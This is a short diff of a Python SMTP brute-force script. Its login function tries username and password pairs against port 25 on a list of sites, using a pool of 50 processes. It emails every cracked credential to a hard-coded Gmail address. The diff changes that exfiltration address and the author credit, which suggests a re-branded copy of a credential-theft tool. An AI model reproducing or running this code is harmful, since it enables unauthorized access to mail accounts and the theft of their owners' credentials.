@@ -74,7 +74,7 @@ def login(site):
                     smtp.connect(site, 25)
                     smtp.login(user + '@' + site, passx)
                     sender = user + '@' + site
-                    receivers = ['moetazbusiness@gmail.com']
+                    receivers = ['gantipakemailu@gmail.com']
                     message = site + '|25|' + user + '@' + site + '|' + passx
                     smtp.sendmail(sender, receivers, message)
                     print la5dhar + "[+] Successful Cracked =>", site + ' ' + user + '@' + site + ' ' + passx + ' \n' + labyadh
@@ -103,5 +103,5 @@ count = 0
 # try:
 p = Pool(50)
 # pool = ThreadPool(12)
-# https://www.facebook.com/007MrSpy/
+# Acep X-Code
 results = p.map(login, [site.rstrip() for site in (list1)])
